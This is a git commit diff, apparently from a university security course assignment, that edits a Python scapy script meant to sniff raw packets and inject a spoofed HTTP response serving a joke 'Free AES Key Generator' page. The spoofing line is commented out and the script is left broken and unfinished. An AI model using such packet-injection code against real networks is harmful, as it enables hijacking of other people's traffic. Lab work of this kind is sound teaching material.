433bc9baf0bc51150ef54f4e5a7abf81359885bf
Swify-Sousa <chso8299@colorado.edu>
2020-04-07 14:22:20 -0600

    pushing attack

--- p3/attack.py
+++ p3/attack.py
@@ -1,7 +1,7 @@
 #!/usr/bin/python3
 
-import scapy
-
+from scapy import * 
+from scapy.layers.inet import IP
 def inject_pkt(pkt):
     #import dnet
     #dnet.ip().send(pkt)
@@ -16,7 +16,9 @@ def handle_pkt(pkt):
     payload_head = "HTTP/1.1 200 OK\r\nServer: nginx/1.4.6 (Ubuntu)\r\nContent-Type: text/html; charset=UTF-8\r\nConnection: keep-alive\r\n\r\n\r\n" # the extra \r \n are for empty fields
     payload_body = """<html> <head><title> Free AES Key Generator!</title> </head> <body> <h1 style= "margin-bottom: 0px"> Free AES Key Generator!</h1> <span style="font-size: 5%"> Definitely not run by the NSA.</span> <br> <br> <br> Your <i>free</i> AES-256 key: <b>4d6167696320576f7264733a2053717565616d697368204f7373696672616765</b> <br> </body> </html>\r\n"""
     payload= payload_head + payload_body
-    packet= "" #still trying to figure how to send spoofed packet back with scapy 
+    #packet= IP(src=pkt[IP].dst, dst=pkt[IP].src)/TCP()/payload
+    #keep getting an "packet metaclass error " that does not show up when searched, but forming the malicoud packet should go somehting like above.
+    inject_pkt(packet)
 def main():
     import socket
     s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, 0x0300)
@@ -24,7 +26,7 @@ def main():
         pkt = s.recv(0xffff)
         handle_pkt(pkt)
         #print(str(pkt))
-        ls(pkt)
+
 
 if __name__ == '__main__':
     main()
